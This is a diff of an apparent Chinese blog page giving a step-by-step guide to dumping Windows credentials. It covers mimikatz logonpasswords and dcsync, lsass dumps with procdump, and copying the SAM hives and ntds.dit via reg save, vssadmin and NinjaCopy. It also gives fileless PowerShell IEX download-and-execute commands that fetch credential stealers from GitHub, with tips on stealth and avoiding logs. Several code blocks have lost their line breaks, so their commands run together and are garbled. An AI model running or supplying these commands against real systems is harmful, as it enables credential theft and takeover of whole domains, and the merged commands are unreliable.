@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -467,7 +470,8 @@
                 <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。</p>
 <p>在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的。</p>
 <p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p>
-<pre><code>username:RID:LM-Hash:NT-Hash</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">username:RID:LM-Hash:NT-Hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，由 IBM 设计，其本质是 DES 加密，由于使用的 DES 算法，因此它的 KEY 是固定的，同时结合一些其他特性导致 LM Hash 加密算法较为脆弱，因此微软在 1993 年在 NT 3.1 中引入了 NTLM 协议。</p>
 <p>NTLM Hash 是基于 MD4 的加密算法，个人版从 Vista 以后，服务版从 Windows Server 2003 以后，系统的认证方式都采用了 NTLM Hash，为了兼容性，微软也只是把 LM Hash 禁用了，只启用了 NTLM Hash.</p>
 <p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。</p>
@@ -484,46 +488,56 @@
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804171846.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="3、QuarkPwDump"><a href="#3、QuarkPwDump" class="headerlink" title="3、QuarkPwDump"></a>3、QuarkPwDump</h2><p>QuarkPwDump 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe">https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe</a></p>
 <p>运行以下命令导出用户 Hash</p>
-<pre><code>QuarkPwDump.exe --dump-hash-local</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">QuarkPwDump.exe --dump-hash-local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804172758.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="4、Get-PassHashes"><a href="#4、Get-PassHashes" class="headerlink" title="4、Get-PassHashes"></a>4、Get-PassHashes</h2><p>Get-PassHashes 是一个 PS 脚本，Get-PassHashes 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
 <p>导入 ps1 脚本，以管理员权限执行 Get-PassHashes 即可。</p>
-<pre><code>Import-Module .\Get-PassHashes.ps1
-Get-PassHashes</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-PassHashes.ps1
+Get-PassHashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>或者绕过无法执行 PS 脚本的限制，直接无文件执行（推荐），同样需要管理员权限。</p>
-<pre><code># 不使用代理
-powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes&quot;
+<pre class="line-numbers language-none"><code class="language-none"># 不使用代理
+powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;
 
 # 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问
-powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://ghproxy.com/raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes&quot;</code></pre>
+powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804174013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="5、mimikatz"><a href="#5、mimikatz" class="headerlink" title="5、mimikatz"></a>5、mimikatz</h2><p>说到密码抓取，又怎能少得了 mimikatz 呢。</p>
 <p>mimikatz 是法国技术大神 Benjamin Delpy 使用 C 语言写的一款轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN 和 K8S 票据，还可以执行哈希传递、票据传递、构建黄金票据等。</p>
 <p>mimikatz 项目 releases 地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
 <p>使用 mimikatz 读取本地 SAM 文件，获取 NTLM Hash</p>
-<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175741.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>或者使用 mimikatz 直接查看明文密码</p>
-<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175941.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>另外也可以采用 PowerShell 远程加载 mimikatz，相较于直接拷贝 mimikatz.exe 到目标主机，这种方式隐藏性要更好些。</p>
-<pre><code># 不使用代理
-powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;
+<pre class="line-numbers language-none"><code class="language-none"># 不使用代理
+powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;
 
 # 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问
-powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://ghproxy.com/raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;</code></pre>
+powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811125132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="6、SAM、SYSTEM、SECURITY-文件"><a href="#6、SAM、SYSTEM、SECURITY-文件" class="headerlink" title="6、SAM、SYSTEM、SECURITY 文件"></a>6、SAM、SYSTEM、SECURITY 文件</h2><h3 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h3><p>直接注册表导出 SAM、SYSTEM、SECURITY 文件</p>
-<pre><code>reg save HKLM\SAM sam.hiv
+<pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SAM sam.hiv
 reg save HKLM\SYSTEM system.hiv
-reg save HKLM\SECURITY security.hiv</code></pre>
+reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>或者使用 ninjacopy 脚本，下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p>
-<pre><code>Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果条件允许也可以使用 U 盘启动盘直接拷贝以下文件</p>
-<pre><code>C:\Windows\System32\config\SAMC:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SECURITY</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\config\SAMC:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SECURITY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>除此之外，使用一些漏洞也可以获取到 SAM、SYSTEM、SECURITY 文件，比如 CVE-2021-36934，具体可参考 <a target="_blank" rel="noopener" href="https://teamssix.com/210725-074847.html">https://teamssix.com/210725-074847.html</a></p>
 <h3 id="获取-HASH"><a href="#获取-HASH" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>用 mimikatz 获取</p>
-<pre><code>mimikatz.exelsadump::sam /sam:sam.hiv /system:system.hiv</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exelsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181245.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>用 cain 获取，找到 Cracker 里的 LM &amp; NTLM Hash，点击加号，选择从 SAM 导入，选择 SAM 文件后，查看 SYSTEM 文件的 HEX，复制到 Boot Key 里，点击下一步即可查看。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811162549.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -533,30 +547,40 @@ reg save HKLM\SECURITY security.hiv</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811161122.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="7、lsass-dmp-文件"><a href="#7、lsass-dmp-文件" class="headerlink" title="7、lsass.dmp 文件"></a>7、lsass.dmp 文件</h2><h3 id="导出文件-1"><a href="#导出文件-1" class="headerlink" title="导出文件"></a>导出文件</h3><p>任务管理器导出 lsass.dmp 文件，在任务管理器中找到 lsass.exe 右击选择创建转储文件即可。</p>
 <p>或者使用 Procdump 导出 lsass.dmp 文件，Procdump 是微软官方发布的工具，因此基本不会被杀软拦截，下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/Procdump.zip">https://download.sysinternals.com/files/Procdump.zip</a></p>
-<pre><code>procdump -accepteula -ma lsass.exe lsass.DMP</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">procdump -accepteula -ma lsass.exe lsass.DMP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="获取-HASH-1"><a href="#获取-HASH-1" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>使用 mimikatz 可获取 lsass.dmp 文件里的 hash 以及明文密码值</p>
-<pre><code>mimikatz.exesekurlsa::minidump lsass.DMPsekurlsa::logonPasswords full</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exesekurlsa::minidump lsass.DMPsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811172353.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="8、ntds-dit-文件"><a href="#8、ntds-dit-文件" class="headerlink" title="8、ntds.dit 文件"></a>8、ntds.dit 文件</h2><p>在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过该文件只在域控中。</p>
 <p>ntds.dit 文件位置:</p>
-<pre><code>C:\Windows\NTDS\NTDS.dit</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\NTDS\NTDS.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="导出-ntds-dit"><a href="#导出-ntds-dit" class="headerlink" title="导出 ntds.dit"></a>导出 ntds.dit</h3><p>Ntdsutil 导出 ntds.dit 和 system 文件，并放在 C 盘目录下</p>
-<pre><code>Ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>vssadmin 导出 ntds.dit</p>
-<pre><code>vssadmin create shadow /for=C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit# SAM 等文件也可以使用 vssadmin 导出copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit# SAM 等文件也可以使用 vssadmin 导出copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>NinjaCopy 脚本也可以，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
-<pre><code>Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="获取-HASH-2"><a href="#获取-HASH-2" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>NTDSDumpEx 查看 ntds.dit，下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
-<pre><code>NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811174802.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>或者使用 impacket 里的 secretsdump.py 脚本查看 ntds.dit 内容，下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<pre><code>python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811175616.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>除了拷贝 ntds.dit 到本地外，mimikatz 也可以直接查看本机的域用户所有的账号密码，不过相对于拷贝 ntds.dit 到自己的机器上来说，直接使用 mimikatz 隐蔽性肯定就会差些了。</p>
-<pre><code>mimikatz.exe# 直接获取 teamssix 域内所有用户 hashlsadump::dcsync /domain:teamssix.com /all /csv# 获取单个用户的详细信息lsadump::dcsync /domain:teamssix.com /user:administrator</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe# 直接获取 teamssix 域内所有用户 hashlsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv# 获取单个用户的详细信息lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h2 id="9、WIFI-密码"><a href="#9、WIFI-密码" class="headerlink" title="9、WIFI 密码"></a>9、WIFI 密码</h2><p>使用自带命令可直接查询</p>
-<pre><code># 获取登录过的 WIFI 名称netsh wlan show profiles# 获取某个连接过的 WIFI 密码netsh wlan show profile name=&quot;teamssix&quot; key=clear# 获取所有连接过的 WIFI 密码for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</code></pre>
+<pre class="line-numbers language-none"><code class="language-none"># 获取登录过的 WIFI 名称netsh wlan show profiles# 获取某个连接过的 WIFI 密码netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear# 获取所有连接过的 WIFI 密码for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812091842.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>参考文章：</p>
@@ -994,7 +1018,7 @@ reg save HKLM\SECURITY security.hiv</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
